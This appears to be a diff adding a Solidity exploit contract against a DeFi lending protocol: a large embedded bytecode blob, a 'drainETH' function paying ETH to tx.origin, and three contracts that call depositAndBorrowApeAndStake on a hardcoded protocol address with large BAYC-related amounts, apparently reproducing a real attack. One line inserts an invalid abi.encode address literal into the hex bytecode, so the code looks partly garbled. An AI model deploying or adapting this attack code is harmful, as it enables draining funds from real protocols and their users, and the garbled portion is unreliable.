+            hex"00252d573d6000803e3d6000fd5b505050506040513d601f19601f8201168201",
+            hex"806040525081019062002553919062003478565b508273ffffffffffffffffff",
+            hex"ffffffffffffffffffffff1663f109fa3b836040518263ffffffff1660e01b81",
+            hex"526004016200258f9190620034aa565b6000604051808303816000875af11580",
+            hex"15620025af573d6000803e3d6000fd5b505050506040513d6000823e3d601f19",
+            hex"601f82011682018060405250810190620025da919062003b2e565b5050505050",
+            hex"565b620025eb62002cd9565b600067ffffffffffffffff811115620026095762",
+            hex"00260862003531565b5b60405190808252806020026020018201604052801562",
+            hex"0026385781602001602082028036833780820191505090505b50816000018190",
+            hex"5250600067ffffffffffffffff8111156200265f576200265e62003531565b5b",
+            hex"6040519080825280602002602001820160405280156200268e57816020016020",
+            hex"82028036833780820191505090505b508160200181905250620026a162002cf3",
+            hex"565b73bc4ca0eda7647a8ab7c2061c2e118a18a936f13d816000019073ffffff",
+            hex"ffffffffffffffffffffffffffffffffff16908173ffffffffffffffffffffff",
+            hex"ffffffffffffffffff1681525050600081602001818152505060008160400181",
+            hex"815250506000600167ffffffffffffffff811115620027235762002722620035",
+            hex"31565b5b60405190808252806020026020018201604052801562002760578160",
+            hex"20015b6200274c62002d2a565b81526020019060019003908162002742579050",
+            hex"5b50905060008067ffffffffffffffff81111562002782576200278162003531",
+            hex"565b5b604051908082528060200260200182016040528015620027bf57816020",
+            hex"015b620027ab62002d68565b815260200190600190039081620027a15790505b",
+            hex"5090508482600081518110620027da57620027d962003560565b5b6020026020",
+            hex"0101516000019063ffffffff16908163ffffffff16815250505b60011562002c",
+            hex"1e576000735954ab967bc958940b7eb73ee84797dc8a2afbb973ffffffffffff",
+            hex"ffffffffffffffffffffffffffff1663ac4afa3860016040518263ffffffff16",
+            hex"60e01b815260040162002853919062003c4f565b608060405180830381865afa",
+            hex"15801562002871573d6000803e3d6000fd5b505050506040513d601f19601f82",
+            hex"0116820180604052508101906200289791906200430e565b505061ffff169150",
+            hex"506000735954ab967bc958940b7eb73ee84797dc8a2afbb973ffffffffffffff",
+            hex"ffffffffffffffffffffffffff166309e833c66001846040518363ffffffff16",
+            hex"60e01b8152600401620028f492919062004380565b608060405180830381865a",
+            hex"fa15801562002912573d6000803e3d6000fd5b505050506040513d601f19601f",
+            hex"8201168201806040525081019062002938919062004437565b90506000734d22",
+            hex"4452801aced8b2f0aebe155379bb5d59438173ffffffffffffffffffffffffff",
+            hex"ffffffffffffff166370a08231735f0a4a59c8b39cddbcf0c683a6374655b4f5",
+            hex"d76e6040518263ffffffff1660e01b81526004016200299f919062003325565b",
+            hex"602060405180830381865afa158015620029bd573d6000803e3d6000fd5b5050",
+            hex"50506040513d601f19601f82011682018060405250810190620029e391906200",
+            hex"3359565b905060008103620029f75750505062002c1e565b81606001516bffff",
+            hex"ffffffffffffffffffff16811162002a18578062002a2c565b81606001516bff",
+            hex"ffffffffffffffffffffff165b8560008151811062002a435762002a42620035",
+            hex"60565b5b6020026020010151602001907bffffffffffffffffffffffffffffff",
+            hex"ffffffffffffffffffffffffff1690817bffffffffffffffffffffffffffffff",
+            hex"ffffffffffffffffffffffffff1681525050730b89032e2722b103386adccae1",
+            hex"8b2f5d4986afa073ffffffffffffffffffffffffffffffffffffffff1663057c",
+            hex"8f38888888886040518563ffffffff1660e01b815260040162002ae694939291",
+            hex"9062003ffa565b600060405180830381600087803b15801562002b0157600080",
+            hex"fd5b505af115801562002b16573d6000803e3d6000fd5b5050505060008067ff",
+            hex"ffffffffffffff81111562002b395762002b3862003531565b5b604051908082",
+            hex"52806020026020018201604052801562002b7657816020015b62002b6262002d",
+            hex"bc565b81526020019060019003908162002b585790505b509050730b89032e27",
+            hex"22b103386adccae18b2f5d4986afa073ffffffffffffffffffffffffffffffff",
+            hex"ffffffff1663060b4c6573bc4ca0eda7647a8ab7c2061c2e118a18a936f13d88",
+            hex"846040518463ffffffff1660e01b815260040162002be0939291906200459456",
+            hex"5b600060405180830381600087803b15801562002bfb57600080fd5b505af115",
+            hex"801562002c10573d6000803e3d6000fd5b5050505050505050620027f9565b50",
+            hex"50505050565b60008062002c34858562002c56565b905062002c4c62002c4582",
+            hex"62002c86565b8462002ca9565b9150509392505050565b62002c6062002e0b56",
+            hex"5b604051806020016040528062002c7b85600001518562002cc1565b81525090",
+            hex"5092915050565b6000670de0b6b3a7640000826000015162002ca29190620041",
+            hex"d0565b9050919050565b6000818362002cb99190620036de565b905092915050",
+            hex"565b6000818362002cd1919062004156565b905092915050565b604051806040",
+            hex"016040528060608152602001606081525090565b604051806060016040528060",
+            hex"0073ffffffffffffffffffffffffffffffffffffffff16815260200160008152",
+            hex"602001600081525090565b6040518060400160405280600063ffffffff168152",
+            hex"60200160007bffffffffffffffffffffffffffffffffffffffffffffffffffff",
+            hex"ffff1681525090565b6040518060600160405280600063ffffffff1681526020",
+            hex"01600063ffffffff168152602001600076ffffffffffffffffffffffffffffff",
+            hex"ffffffffffffffff1681525090565b610b8180620045e083390190565b604051",
+            hex"8060800160405280600063ffffffff168152602001600063ffffffff16815260",
+            hex"2001600076ffffffffffffffffffffffffffffffffffffffffffffff16815260",
+            hex"20016000151581525090565b6040518060200160405280600081525090565b60",
+            hex"00604051905090565b600080fd5b600080fd5b600073ffffffffffffffffffff",
+            hex"ffffffffffffffffffff82169050919050565b600062002e5f8262002e32565b",
+            hex"9050919050565b62002e718162002e52565b811462002e7d57600080fd5b5056",
+            hex"5b60008135905062002e918162002e66565b92915050565b600080fd5b600080",
+            hex"fd5b600080fd5b60008083601f84011262002ebf5762002ebe62002e97565b5b",
+            hex"8235905067ffffffffffffffff81111562002edf5762002ede62002e9c565b5b",
+            hex"60208301915083600182028301111562002efe5762002efd62002ea1565b5b92",
+            hex"50929050565b60008060006040848603121562002f215762002f2062002e2856",
+            hex"5b5b600062002f318682870162002e80565b935050602084013567ffffffffff",
+            hex"ffffff81111562002f555762002f5462002e2d565b5b62002f63868287016200",
+            hex"2ea6565b92509250509250925092565b6000819050919050565b62002f848162",
+            hex"002f6f565b811462002f9057600080fd5b50565b60008135905062002fa48162",
+            hex"002f79565b92915050565b60006020828403121562002fc35762002fc262002e",
+            hex"28565b5b600062002fd38482850162002f93565b91505092915050565b600080",
+            hex"60008060006080868803121562002ffb5762002ffa62002e28565b5b60006200",
+            hex"300b8882890162002e80565b95505060206200301e8882890162002e80565b94",
+            hex"50506040620030318882890162002f93565b935050606086013567ffffffffff",
+            hex"ffffff81111562003055576200305462002e2d565b5b62003063888289016200",
+            hex"2ea6565b92509250509295509295909350565b60007fffffffff000000000000",
+            hex"0000000000000000000000000000000000000000000082169050919050565b62",
+            hex"0030a98162003072565b82525050565b6000602082019050620030c660008301",
+            hex"846200309e565b92915050565b60008060408385031215620030e657620030e5",
+            hex"62002e28565b5b6000620030f68582860162002f93565b925050602062003109",
+            hex"8582860162002f93565b9150509250929050565b600080600060608486031215",
+            hex"6200312f576200312e62002e28565b5b60006200313f8682870162002e80565b",
+            hex"9350506020620031528682870162002f93565b92505060406200316586828701",
+            hex"62002e80565b9150509250925092565b60008060408385031215620031895762",
+            hex"00318862002e28565b5b6000620031998582860162002e80565b925050602062",
+            hex"0031ac8582860162002e80565b9150509250929050565b600080600080606085",
+            hex"87031215620031d357620031d262002e28565b5b6000620031e3878288016200",
+            hex"2f93565b9450506020620031f68782880162002f93565b935050604085013567",
+            hex"ffffffffffffffff8111156200321a576200321962002e2d565b5b6200322887",
+            hex"82880162002ea6565b925092505092959194509250565b600060208284031215",
+            hex"6200324f576200324e62002e28565b5b60006200325f8482850162002e80565b",
+            hex"91505092915050565b600081905092915050565b828183376000838301525050",
+            hex"50565b600062003290838562003268565b93506200329f83858462003273565b",
+            hex"82840190509392505050565b6000620032ba82848662003282565b9150819050",
+            hex"9392505050565b620032d18162002e52565b82525050565b620032e28162002f",
+            hex"6f565b82525050565b6000606082019050620032ff6000830186620032c6565b",
+            hex"6200330e6020830185620032c6565b6200331d6040830184620032d7565b9493",
+            hex"50505050565b60006020820190506200333c6000830184620032c6565b929150",
+            hex"50565b600081519050620033538162002f79565b92915050565b600060208284",
+            hex"03121562003372576200337162002e28565b5b60006200338284828501620033",
+            hex"42565b91505092915050565b6000604082019050620033a26000830185620032",
+            hex"c6565b620033b16020830184620032d7565b9392505050565b60008282526020",
+            hex"8201905092915050565b7f303000000000000000000000000000000000000000",
+            hex"0000000000000000000000600082015250565b600062003401600283620033b8",
+            hex"565b91506200340e82620033c9565b602082019050919050565b600060208201",
+            hex"905081810360008301526200343481620033f2565b9050919050565b60008115",
+            hex"159050919050565b62003452816200343b565b81146200345e57600080fd5b50",
+            hex"565b600081519050620034728162003447565b92915050565b60006020828403",
+            hex"121562003491576200349062002e28565b5b6000620034a18482850162003461",
+            hex"565b91505092915050565b6000602082019050620034c16000830184620032d7",
+            hex"565b92915050565b6000819050919050565b6000819050919050565b60006200",
+            hex"34fc620034f6620034f084620034c7565b620034d1565b62002f6f565b905091",
+            hex"9050565b6200350e81620034db565b82525050565b6000602082019050620035",
+            hex"2b600083018462003503565b92915050565b7f4e487b71000000000000000000",
+            hex"00000000000000000000000000000000000000600052604160045260246000fd",
+            hex"5b7f4e487b710000000000000000000000000000000000000000000000000000",
+            hex"0000600052603260045260246000fd5b600081519050919050565b6000828252",
+            hex"60208201905092915050565b6000819050602082019050919050565b620035c6",
+            hex"8162002f6f565b82525050565b6000620035da8383620035bb565b6020830190",
+            hex"5092915050565b6000602082019050919050565b600062003600826200358f56",
+            hex"5b6200360c81856200359a565b93506200361983620035ab565b8060005b8381",
+            hex"101562003650578151620036348882620035cc565b97506200364183620035e6",
+            hex"565b9250506001810190506200361d565b5085935050505092915050565b6000",
+            hex"6060820190508181036000830152620036798186620035f3565b905081810360",
+            hex"208301526200368f8185620035f3565b90508181036040830152620036a58184",
+            hex"620035f3565b9050949350505050565b7f4e487b710000000000000000000000",
+            hex"0000000000000000000000000000000000600052601160045260246000fd5b60",
+            hex"00620036eb8262002f6f565b9150620036f88362002f6f565b92508282019050",
+            hex"80821115620037135762003712620036af565b5b92915050565b7f3031000000",
+            hex"0000000000000000000000000000000000000000000000000000006000820152",
+            hex"50565b600062003751600283620033b8565b91506200375e8262003719565b60",
+            hex"2082019050919050565b60006020820190508181036000830152620037848162",
+            hex"003742565b9050919050565b6000819050919050565b620037aa620037a48262",
+            hex"002f6f565b6200378b565b82525050565b6000620037be828562003795565b60",
+            hex"2082019150620037d0828462003795565b602082019150819050939250505056",
+            hex"5b6000819050919050565b60006200380b62003805620037ff84620037e0565b",
+            hex"620034d1565b62002f6f565b9050919050565b6200381d81620037ea565b8252",
+            hex"5050565b600081519050919050565b600082825260208201905092915050565b",
+            hex"60005b838110156200385f57808201518184015260208101905062003842565b",
+            hex"60008484015250505050565b6000601f19601f8301169050919050565b600062",
+            hex"0038898262003823565b6200389581856200382e565b9350620038a781856020",
+            hex"86016200383f565b620038b2816200386b565b840191505092915050565b6000",
+            hex"608082019050620038d46000830187620032c6565b620038e360208301866200",
+            hex"32d7565b620038f2604083018562003812565b81810360608301526200390681",
+            hex"846200387c565b905095945050505050565b600081519050919050565b600082",
+            hex"825260208201905092915050565b6000819050602082019050919050565b6200",
+            hex"39488162002e52565b82525050565b60006200395c83836200393d565b602083",
+            hex"01905092915050565b6000602082019050919050565b60006200398282620039",
+            hex"11565b6200398e81856200391c565b93506200399b836200392d565b8060005b",
+            hex"83811015620039d2578151620039b688826200394e565b9750620039c3836200",
+            hex"3968565b9250506001810190506200399f565b5085935050505092915050565b",
+            hex"60006020820190508181036000830152620039fb818462003975565b90509291",
+            hex"5050565b62003a0e826200386b565b810181811067ffffffffffffffff821117",
+            hex"1562003a305762003a2f62003531565b5b80604052505050565b600062003a45",
+            hex"62002e1e565b905062003a53828262003a03565b919050565b600067ffffffff",
+            hex"ffffffff82111562003a765762003a7562003531565b5b602082029050602081",
+            hex"019050919050565b600062003a9e62003a988462003a58565b62003a39565b90",
+            hex"50808382526020820190506020840283018581111562003ac45762003ac36200",
+            hex"2ea1565b5b835b8181101562003af1578062003adc888262003342565b845260",
+            hex"20840193505060208101905062003ac6565b5050509392505050565b60008260",
+            hex"1f83011262003b135762003b1262002e97565b5b815162003b25848260208601",
+            hex"62003a87565b91505092915050565b60006020828403121562003b475762003b",
+            hex"4662002e28565b5b600082015167ffffffffffffffff81111562003b68576200",
+            hex"3b6762002e2d565b5b62003b768482850162003afb565b91505092915050565b",
+            hex"6000819050919050565b600062003baa62003ba462003b9e8462003b7f565b62",
+            hex"0034d1565b62002f6f565b9050919050565b62003bbc8162003b89565b825250",
+            hex"50565b600060208201905062003bd9600083018462003bb1565b92915050565b",
+            hex"600060408201905062003bf66000830185620032c6565b62003c056020830184",
+            hex"62003bb1565b9392505050565b6000819050919050565b600062003c3762003c",
+            hex"3162003c2b8462003c0c565b620034d1565b62002f6f565b9050919050565b62",
+            hex"003c498162003c16565b82525050565b600060208201905062003c6660008301",
+            hex"8462003c3e565b92915050565b600082825260208201905092915050565b6000",
+            hex"62003c8a826200358f565b62003c96818562003c6c565b935062003ca3836200",
+            hex"35ab565b8060005b8381101562003cda57815162003cbe8882620035cc565b97",
+            hex"5062003ccb83620035e6565b92505060018101905062003ca7565b5085935050",
+            hex"505092915050565b6000604083016000830151848203600086015262003d0682",
+            hex"8262003c7d565b9150506020830151848203602086015262003d22828262003c",
+            hex"7d565b9150508091505092915050565b60608201600082015162003d47600085",
+            hex"01826200393d565b50602082015162003d5c6020850182620035bb565b506040",
+            hex"82015162003d716040850182620035bb565b50505050565b6000815190509190",
+            hex"50565b600082825260208201905092915050565b600081905060208201905091",
+            hex"9050565b600063ffffffff82169050919050565b62003dbe8162003da3565b82",
+            hex"525050565b60007bffffffffffffffffffffffffffffffffffffffffffffffff",
+            hex"ffffffff82169050919050565b62003df78162003dc4565b82525050565b6040",
+            hex"8201600082015162003e15600085018262003db3565b50602082015162003e2a",
+            hex"602085018262003dec565b50505050565b600062003e3e838362003dfd565b60",
+            hex"408301905092915050565b6000602082019050919050565b600062003e648262",
+            hex"003d77565b62003e70818562003d82565b935062003e7d8362003d93565b8060",
+            hex"005b8381101562003eb457815162003e98888262003e30565b975062003ea583",
+            hex"62003e4a565b92505060018101905062003e81565b5085935050505092915050",
+            hex"565b600081519050919050565b600082825260208201905092915050565b6000",
+            hex"819050602082019050919050565b600076ffffffffffffffffffffffffffffff",
+            hex"ffffffffffffffff82169050919050565b62003f1b8162003eed565b82525050",
+            hex"565b60608201600082015162003f39600085018262003db3565b506020820151",
+            hex"62003f4e602085018262003db3565b50604082015162003f6360408501826200",
+            hex"3f10565b50505050565b600062003f77838362003f21565b6060830190509291",
+            hex"5050565b6000602082019050919050565b600062003f9d8262003ec1565b6200",
+            hex"3fa9818562003ecc565b935062003fb68362003edd565b8060005b8381101562",
+            hex"003fed57815162003fd1888262003f69565b975062003fde8362003f83565b92",
+            hex"505060018101905062003fba565b5085935050505092915050565b600060c082",
+            hex"019050818103600083015262004016818762003ce7565b905062004027602083",
+            hex"018662003d2f565b81810360808301526200403b818562003e57565b90508181",
+            hex"0360a083015262004051818462003f90565b905095945050505050565b620040",
+            hex"67816200343b565b82525050565b600060408201905062004084600083018562",
+            hex"0032c6565b6200409360208301846200405c565b9392505050565b6000819050",
+            hex"919050565b6000620040c5620040bf620040b9846200409a565b620034d1565b",
+            hex"62002f6f565b9050919050565b620040d781620040a4565b82525050565b6000",
+            hex"602082019050620040f46000830184620040cc565b92915050565b6000806000",
+            hex"6060848603121562004116576200411562002e28565b5b600062004126868287",
+            hex"0162003342565b9350506020620041398682870162003342565b925050604062",
+            hex"00414c8682870162003342565b9150509250925092565b600062004163826200",
+            hex"2f6f565b9150620041708362002f6f565b9250828202620041808162002f6f56",
+            hex"5b915082820484148315176200419a5762004199620036af565b5b5092915050",
+            hex"565b7f4e487b7100000000000000000000000000000000000000000000000000",
+            hex"000000600052601260045260246000fd5b6000620041dd8262002f6f565b9150",
+            hex"620041ea8362002f6f565b925082620041fd57620041fc620041a1565b5b8282",
+            hex"04905092915050565b6000620042158262002f6f565b9150620042228362002f",
+            hex"6f565b92508282039050818111156200423d576200423c620036af565b5b9291",
+            hex"5050565b600065ffffffffffff82169050919050565b62004260816200424356",
+            hex"5b81146200426c57600080fd5b50565b60008151905062004280816200425556",
+            hex"5b92915050565b600061ffff82169050919050565b6200429f8162004286565b",
+            hex"8114620042ab57600080fd5b50565b600081519050620042bf8162004294565b",
+            hex"92915050565b60006bffffffffffffffffffffffff82169050919050565b6200",
+            hex"42e881620042c5565b8114620042f457600080fd5b50565b6000815190506200",
+            hex"430881620042dd565b92915050565b600080600080608085870312156200432b",
+            hex"576200432a62002e28565b5b60006200433b878288016200426f565b94505060",
+            hex"206200434e87828801620042ae565b93505060406200436187828801620042f7",
+            hex"565b92505060606200437487828801620042f7565b9150509295919450925056",
+            hex"5b600060408201905062004397600083018562003c3e565b620043a660208301",
+            hex"84620032d7565b9392505050565b600080fd5b600060808284031215620043cb",
+            hex"57620043ca620043ad565b5b620043d7608062003a39565b90506000620043e9",
+            hex"848285016200426f565b6000830152506020620043ff848285016200426f565b",
+            hex"60208301525060406200441584828501620042f7565b60408301525060606200",
+            hex"442b84828501620042f7565b60608301525092915050565b6000608082840312",
+            hex"1562004450576200444f62002e28565b5b60006200446084828501620043b256",
+            hex"5b91505092915050565b600081519050919050565b6000828252602082019050",
+            hex"92915050565b6000819050602082019050919050565b620044a0816200343b56",
+            hex"5b82525050565b608082016000820151620044be600085018262003db3565b50",
+            hex"6020820151620044d3602085018262003db3565b506040820151620044e86040",
+            hex"85018262003f10565b506060820151620044fd606085018262004495565b5050",
+            hex"5050565b6000620045118383620044a6565b60808301905092915050565b6000",
+            hex"602082019050919050565b6000620045378262004469565b6200454381856200",
+            hex"4474565b9350620045508362004485565b8060005b8381101562004587578151",
+            hex"6200456b888262004503565b975062004578836200451d565b92505060018101",
+            hex"905062004554565b5085935050505092915050565b6000606082019050620045",
+            hex"ab6000830186620032c6565b8181036020830152620045bf818562003e57565b",
+            hex"90508181036040830152620045d581846200452a565b905094935050505056fe",
+            hex"608060405234801561001057600080fd5b50604051610b81380380610b818339",
+            hex"81810160405281019061003291906106d0565b730b89032e2722b103386adcca",
+            hex"e18b2f5d4986afa073ffffffffffffffffffffffffffffffffffffffff166305",
+            hex"7c8f38858585856040518563ffffffff1660e01b815260040161008594939291",
+            hex"90610ada565b600060405180830381600087803b15801561009f57600080fd5b",
+            hex"505af11580156100b3573d6000803e3d6000fd5b5050505050505050610b3456",
+            hex"5b6000604051905090565b600080fd5b600080fd5b600080fd5b6000601f1960",
+            hex"1f8301169050919050565b7f4e487b7100000000000000000000000000000000",
+            abi.encode(address(0x600052604160045260246000fd5b610122826100)),
+            hex"d9565b810181811067ffffffffffffffff82111715610141576101406100ea56",
+            hex"5b5b80604052505050565b60006101546100c0565b9050610160828261011956",
+            hex"5b919050565b600080fd5b600080fd5b600067ffffffffffffffff8211156101",
+            hex"8a576101896100ea565b5b602082029050602081019050919050565b600080fd",
+            hex"5b6000819050919050565b6101b3816101a0565b81146101be57600080fd5b50",
+            hex"565b6000815190506101d0816101aa565b92915050565b60006101e96101e484",
+            hex"61016f565b61014a565b90508083825260208201905060208402830185811115",
+            hex"61020c5761020b61019b565b5b835b81811015610235578061022188826101c1",
+            hex"565b84526020840193505060208101905061020e565b5050509392505050565b",
+            hex"600082601f8301126102545761025361016a565b5b8151610264848260208601",
+            hex"6101d6565b91505092915050565b600060408284031215610283576102826100",
+            hex"d4565b5b61028d604061014a565b9050600082015167ffffffffffffffff8111",
+            hex"156102ad576102ac610165565b5b6102b98482850161023f565b600083015250",
+            hex"602082015167ffffffffffffffff8111156102dd576102dc610165565b5b6102",
+            hex"e98482850161023f565b60208301525092915050565b600073ffffffffffffff",
+            hex"ffffffffffffffffffffffffff82169050919050565b6000610320826102f556",
+            hex"5b9050919050565b61033081610315565b811461033b57600080fd5b50565b60",
+            hex"008151905061034d81610327565b92915050565b600060608284031215610369",
+            hex"576103686100d4565b5b610373606061014a565b905060006103838482850161",
+            hex"033e565b6000830152506020610397848285016101c1565b6020830152506040",
+            hex"6103ab848285016101c1565b60408301525092915050565b600067ffffffffff",
+            hex"ffffff8211156103d2576103d16100ea565b5b60208202905060208101905091",
+            hex"9050565b600063ffffffff82169050919050565b6103fc816103e3565b811461",
+            hex"040757600080fd5b50565b600081519050610419816103f3565b92915050565b",
+            hex"60007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff82",
+            hex"169050919050565b6104508161041f565b811461045b57600080fd5b50565b60",
+            hex"008151905061046d81610447565b92915050565b600060408284031215610489",
+            hex"576104886100d4565b5b610493604061014a565b905060006104a38482850161",
+            hex"040a565b60008301525060206104b78482850161045e565b6020830152509291",
+            hex"5050565b60006104d66104d1846103b7565b61014a565b905080838252602082",
+            hex"019050604084028301858111156104f9576104f861019b565b5b835b81811015",
+            hex"610522578061050e8882610473565b8452602084019350506040810190506104",
+            hex"fb565b5050509392505050565b600082601f8301126105415761054061016a56",
+            hex"5b5b81516105518482602086016104c3565b91505092915050565b600067ffff",
+            hex"ffffffffffff821115610575576105746100ea565b5b60208202905060208101",
+            hex"9050919050565b600076ffffffffffffffffffffffffffffffffffffffffffff",
+            hex"ff82169050919050565b6105b281610586565b81146105bd57600080fd5b5056",
+            hex"5b6000815190506105cf816105a9565b92915050565b60006060828403121561",
+            hex"05eb576105ea6100d4565b5b6105f5606061014a565b90506000610605848285",
+            hex"0161040a565b60008301525060206106198482850161040a565b602083015250",
+            hex"604061062d848285016105c0565b60408301525092915050565b600061064c61",
+            hex"06478461055a565b61014a565b90508083825260208201905060608402830185",
+            hex"81111561066f5761066e61019b565b5b835b8181101561069857806106848882",
+            hex"6105d5565b845260208401935050606081019050610671565b50505093925050",
+            hex"50565b600082601f8301126106b7576106b661016a565b5b81516106c7848260",
+            hex"208601610639565b91505092915050565b60008060008060c085870312156106",
+            hex"ea576106e96100ca565b5b600085015167ffffffffffffffff81111561070857",
+            hex"6107076100cf565b5b6107148782880161026d565b9450506020610725878288",
+            hex"01610353565b935050608085015167ffffffffffffffff811115610746576107",
+            hex"456100cf565b5b6107528782880161052c565b92505060a085015167ffffffff",
+            hex"ffffffff811115610773576107726100cf565b5b61077f878288016106a2565b",
+            hex"91505092959194509250565b600081519050919050565b600082825260208201",
+            hex"905092915050565b6000819050602082019050919050565b6107c0816101a056",
+            hex"5b82525050565b60006107d283836107b7565b60208301905092915050565b60",
+            hex"00602082019050919050565b60006107f68261078b565b610800818561079656",
+            hex"5b935061080b836107a7565b8060005b8381101561083c578151610823888261",
+            hex"07c6565b975061082e836107de565b92505060018101905061080f565b508593",
+            hex"5050505092915050565b60006040830160008301518482036000860152610866",
+            hex"82826107eb565b9150506020830151848203602086015261088082826107eb56",
+            hex"5b9150508091505092915050565b61089681610315565b82525050565b606082",
+            hex"0160008201516108b2600085018261088d565b5060208201516108c560208501",
+            hex"826107b7565b5060408201516108d860408501826107b7565b50505050565b60",
+            hex"0081519050919050565b600082825260208201905092915050565b6000819050",
+            hex"602082019050919050565b610913816103e3565b82525050565b610922816104",
+            hex"1f565b82525050565b60408201600082015161093e600085018261090a565b50",
+            hex"60208201516109516020850182610919565b50505050565b6000610963838361",
+            hex"0928565b60408301905092915050565b6000602082019050919050565b600061",
+            hex"0987826108de565b61099181856108e9565b935061099c836108fa565b806000",
+            hex"5b838110156109cd5781516109b48882610957565b97506109bf8361096f565b",
+            hex"9250506001810190506109a0565b5085935050505092915050565b6000815190",
+            hex"50919050565b600082825260208201905092915050565b600081905060208201",
+            hex"9050919050565b610a0f81610586565b82525050565b60608201600082015161",
+            hex"0a2b600085018261090a565b506020820151610a3e602085018261090a565b50",
+            hex"6040820151610a516040850182610a06565b50505050565b6000610a63838361",
+            hex"0a15565b60608301905092915050565b6000602082019050919050565b600061",
+            hex"0a87826109da565b610a9181856109e5565b9350610a9c836109f6565b806000",
+            hex"5b83811015610acd578151610ab48882610a57565b9750610abf83610a6f565b",
+            hex"925050600181019050610aa0565b5085935050505092915050565b600060c082",
+            hex"0190508181036000830152610af48187610849565b9050610b03602083018661",
+            hex"089c565b8181036080830152610b15818561097c565b905081810360a0830152",
+            hex"610b298184610a7c565b905095945050505050565b603f80610b426000396000",
+            hex"f3fe6080604052600080fdfea26469706673582212209bf3570c829bb3cb4b82",
+            hex"7775a626e258d27d367044d7912b5def7146cb116fe464736f6c634300081200",
+            hex"33a26469706673582212206a83f0229d773d3c771d8a6b4d19b40909efbfd88a",
+            hex"eca7a7cf349711e07d0f2b64736f6c63430008120033"
+        );
+        assembly {
+            return(add(rt, 0x20), mload(rt))
+        }
+    }
+
+    function drainETH(address) public {
+        address(tx.origin).call{value: 102306731023453679484}("");
+    }
+
+    function call() public payable {}
+
+    fallback() external payable {
+        bytes4 selector = bytes4(msg.data);
+        if (selector == 0x4183411e) {
+            x4183411e();
+            return;
+        }
+        if (selector == 0x4ee72226) {
+            x4ee72226();
+            return;
+        }
+        revert("no such function");
+    }
+}
+
+contract Xe46a {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x0b89 = 0x0B89032E2722b103386aDCcaE18B2F5D4986aFa0;
+    address constant xbc4c = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
+
+    constructor() payable {
+        uint256[] memory arr399 = new uint256[](0);
+        uint256[] memory arr400 = new uint256[](0);
+        S1 memory s147 = S1(arr399, arr400);
+        S2 memory s247 = S2(xbc4c, 0, 130000000000000000000000);
+        S3[] memory arr401 = new S3[](0);
+        S4[] memory arr402 = new S4[](0);
+        I(x0b89).depositAndBorrowApeAndStake(s147, s247, arr401, arr402);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract Xbd02 {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x0b89 = 0x0B89032E2722b103386aDCcaE18B2F5D4986aFa0;
+    address constant xbc4c = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
+
+    constructor() payable {
+        uint256[] memory arr03 = new uint256[](0);
+        uint256[] memory arr04 = new uint256[](0);
+        S1 memory s101 = S1(arr03, arr04);
+        S2 memory s201 = S2(xbc4c, 0, 206227682165404022135955);
+        S3[] memory arr05 = new S3[](0);
+        S4[] memory arr06 = new S4[](0);
+        I(x0b89).depositAndBorrowApeAndStake(s101, s201, arr05, arr06);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
+
+contract Xeb52 {
+    address immutable r = address(this);
+    receive() external payable {}
+    address constant x0b89 = 0x0B89032E2722b103386aDCcaE18B2F5D4986aFa0;
+    address constant xbc4c = 0xBC4CA0EdA7647A8aB7C2061c2E118A18a936f13D;
+
+    constructor() payable {
+        uint256[] memory arr641 = new uint256[](0);
+        uint256[] memory arr642 = new uint256[](0);
+        S1 memory s175 = S1(arr641, arr642);
+        S2 memory s275 = S2(xbc4c, 0, 220000000000000000000000);
+        S3[] memory arr643 = new S3[](0);
+        S4[] memory arr644 = new S4[](0);
+        I(x0b89).depositAndBorrowApeAndStake(s175, s275, arr643, arr644);
+    }
+
+    fallback() external payable {
+        revert("no such function");
+    }
+}
